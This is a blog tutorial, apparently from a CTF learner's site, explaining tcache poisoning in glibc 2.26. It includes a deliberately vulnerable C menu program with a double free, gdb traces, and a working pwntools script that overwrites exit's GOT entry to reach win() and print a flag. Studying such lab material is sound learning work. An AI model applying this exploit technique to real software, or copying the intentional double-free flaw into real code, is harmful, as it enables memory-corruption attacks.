<!DOCTYPE html>
<html>
<head>

  <meta charset="UTF-8">
  <title>Welcome</title>
  <meta name="viewport" content="width=device-width">

  <!--[if lt IE 9]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->

  <link href="/assets/css/style.css" rel="stylesheet" />
  <link href="/assets/css/colors-dark.css" rel="stylesheet" />

</head>

<body>



  <header id="header">
    <h1><a href="/"><i class="icon-sun"></i> Tripoloski</a></h1>
    <p>just a student whose love to break things mostly binary , i do programming in web as a backend developer, i'm a bug hunter too.feel free to contact me if you think i can help your company arsalan.dp@gmail.com</p>
  </header>



  <div id="page">



    <div id="sidebar">
      <nav>
        <ul>
          <li><a href="/">Home</a></li>
          <li><a href="/archives">Archive</a></li>
          <li><a href="/about">About</a></li>
          <li><a href="https://twitter.com/tripoloski_1337">Twitter</a></li>
          <li><a href="/feed.xml">RSS Feed</a></li>
        </ul>
      </nav>
    </div>



    <div id="content">
      

	<article class="post">

		
			<h1><a href="/2018/12/10/tcache_poisoning/">Tcache Poisoning [heap exploitation]</a></h1>
		

		<div class="post-content"><h1 id="tcache-poisoning">Tcache Poisoning</h1>
<p>what is tcache poisoning ? 
In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc.
and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7ffedaf11040.
Allocating 1 buffer.
malloc(128): 0x55a2b964b260
Freeing the buffer...
Now the tcache list has [ 0x55a2b964b260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55a2b964b260
to point to the location to control (0x7ffedaf11040).
1st malloc(128): 0x55a2b964b260
Now the tcache list has [ 0x7ffedaf11040 ].
2nd malloc(128): 0x7ffedaf11040
We got the control
</code></pre></div></div>

<p>for another example we will try to exploit this simple program by using tcache poisoning:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define SZ_BLOCK 200
#define SZ_HEAP  10
#define SZ_FLAG 100
</span>
<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="n">u_int</span> <span class="o">*</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

<span class="kt">void</span> <span class="n">win</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SZ_FLAG</span><span class="p">];</span>
	<span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">"[!] error code 901"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">SZ_FLAG</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">welcome</span><span class="p">(){</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"     __                      __                           _                      _              "</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"    / /_ _____ ____ _ _____ / /_   ___     ____   ____   (_)_____ ____   ____   (_)____   ____ _"</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"   / __// ___// __ `// ___// __ </span><span class="se">\\</span><span class="s"> / _ </span><span class="se">\\</span><span class="s">   / __ </span><span class="se">\\</span><span class="s"> / __ </span><span class="se">\\</span><span class="s"> / // ___// __ </span><span class="se">\\</span><span class="s"> / __ </span><span class="se">\\</span><span class="s"> / // __ </span><span class="se">\\</span><span class="s"> / __ `/"</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"  / /_ / /__ / /_/ // /__ / / / //  __/  / /_/ // /_/ // /(__  )/ /_/ // / / // // / / // /_/ / "</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"  </span><span class="se">\\</span><span class="s">__/ </span><span class="se">\\</span><span class="s">___/ </span><span class="se">\\</span><span class="s">__,_/ </span><span class="se">\\</span><span class="s">___//_/ /_/ </span><span class="se">\\</span><span class="s">___/  / .___/ </span><span class="se">\\</span><span class="s">____//_//____/ </span><span class="se">\\</span><span class="s">____//_/ /_//_//_/ /_/ </span><span class="se">\\</span><span class="s">__, /  "</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"       HackerClass Gunadarma @2019     /_/        author: arsalan (tripoloski)         /____/   "</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">menu</span><span class="p">(){</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"|         Menu        |"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"| 1. allocate memory  |"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"| 2. freeing memory   |"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"| 3. exit             |"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"+---------------------+"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"| select [1-3] : "</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">init</span><span class="p">(){</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="mi">2</span> <span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="mi">2</span> <span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">create_memory</span><span class="p">(){</span>
	<span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[?] size : "</span><span class="p">);</span>
	<span class="c1">//read(0,size , sizeof(size));
</span>	<span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span> <span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[?] data : "</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x88</span><span class="p">){</span>
		<span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
		<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span> <span class="p">,</span> <span class="n">size</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"[+] memory allocated!"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">release_memory</span><span class="p">(){</span>
	<span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">main</span><span class="p">(){</span>
	<span class="n">init</span><span class="p">();</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="n">welcome</span><span class="p">();</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
		<span class="n">menu</span><span class="p">();</span>
		<span class="n">read</span><span class="p">(</span><span class="mi">0</span> <span class="p">,</span> <span class="n">buf</span> <span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
		<span class="k">switch</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">)){</span>
			<span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
				<span class="n">create_memory</span><span class="p">();</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
				<span class="n">release_memory</span><span class="p">();</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"[+] exiting..."</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">default</span><span class="o">:</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"[!] invalid choice error code 1902"</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>you can find this challenge on my repository <a href="https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning">here</a> in this case we have to allocating memory and double freeing , since there’s no checks for double free on glibc-2.26+. so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc(0x100)
free(0)
free(0)
malloc(0x100) &lt;------ control rdi
malloc(0x100) &lt;------ just a padding
malloc(0x100) &lt;------ another control 
</code></pre></div></div>

<h3 id="how-can-it-be-">how can it be ?</h3>
<p>if you look into gdb there’s something interesting at address <strong>&lt;malloc+407&gt;</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> → 0x7ffff7a7b207 &lt;malloc+407&gt;     mov    rdi, QWORD PTR [rdx]
</code></pre></div></div>

<p>this instruction will mov rdx value to rdi. it’s mean it will move whatever value is from rdx to rdi register. and suddenly our rdx is filled with our input before</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$rax   : 0x5
$rbx   : 0x64
$rcx   : 0x0000000000602010  →  0x0000000000000000
$rdx   : 0x4141414141414141 ("AAAAAAAA"?) &lt;----- our input data from the seccond malloc
$rsp   : 0x00007fffffffe320  →  0x0000000000400dd1  →  "+---------------------+"
$rbp   : 0xffffffffffffffb0
$rsi   : 0x0000000000602038  →  0x0000000000000000
$rdi   : 0x64
$rip   : 0x00007ffff7a7b207  →  &lt;malloc+407&gt; mov rdi, QWORD PTR [rdx]
$r8    : 0xb
$r9    : 0x0
$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
$r11   : 0x246
$r12   : 0x0000000000400740  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x00007fffffffe460  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
</code></pre></div></div>

<p>in this case we can doing GOT overwrite from exit() function to win() function</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">"[+] exiting..."</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="o">&lt;--</span> <span class="n">our</span> <span class="n">goal</span> <span class="n">to</span> <span class="n">changed</span> <span class="n">it</span> <span class="n">to</span> <span class="n">win</span><span class="p">()</span>
		<span class="k">break</span><span class="p">;</span></code></pre></figure>

<p>to make it more clear and reliable i made a python script to exploit this binary</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./tcache_poisoning"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span> <span class="p">):</span>
	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"| select [1-3] :"</span><span class="p">,</span><span class="s">"1"</span><span class="p">)</span>
	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[?] size :"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"[?] data :"</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"allocating"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
	<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"| select [1-3] :"</span><span class="p">,</span><span class="s">"2"</span><span class="p">)</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"freeing"</span><span class="p">)</span>

<span class="n">win_plt</span> <span class="o">=</span> <span class="mh">0x0000000000400827</span>
<span class="n">exit_got</span> <span class="o">=</span> <span class="mh">0x000000601348</span>
<span class="c">#gdb.attach(r)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="n">free</span><span class="p">()</span>
<span class="n">free</span><span class="p">()</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_got</span><span class="p">))</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">win_plt</span><span class="p">))</span> 

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>

<p>after running this python script we can select option 3 to trigger exit() and exit() is not the real exit() function anymore it was win() function since we doing GOT overwrite</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Starting local process './tcache_poisoning': pid 28800
[*] allocating
[*] allocating
[*] freeing
[*] freeing
[*] allocating
[*] allocating
[*] allocating
[*] Switching to interactive mode
 [+] memory allocated!
+---------------------+
|         Menu        |
+---------------------+
| 1. allocate memory  |
| 2. freeing memory   |
| 3. exit             |
+---------------------+
| select [1-3] : $ 3
[+] exiting...
ctf{y0u_must_b3_a_pwnerrrr!!!!!}
</code></pre></div></div>

<p>as you can see there’s string <strong><em>ctf{y0u_must_b3_a_pwnerrrr!!!!!}</em></strong> it mean our win() function has called and give us data from file flag.txt you can see what win() actually do here</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">win</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SZ_FLAG</span><span class="p">];</span>
	<span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">"[!] error code 901"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">SZ_FLAG</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>
</div>

	</article>






    </div>



  </div>



  <footer id="footer">
    <p class="copyright">Copyright &copy; 2019 Tripoloski. Powered by <a href="http://jekyllrb.com">Jekyll</a>, theme by <a href="http://www.webmaster-source.com">Matt Harzewski</a></p>
  </footer>



  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
  <script src="/assets/js/jquery.mobilemenu.min.js"></script>

  <script>
    $(document).ready(function(){
      $('#sidebar nav ul').mobileMenu({'topOptionText': 'Menu', 'prependTo': '#sidebar nav'});
    });
  </script>



</body>
</html>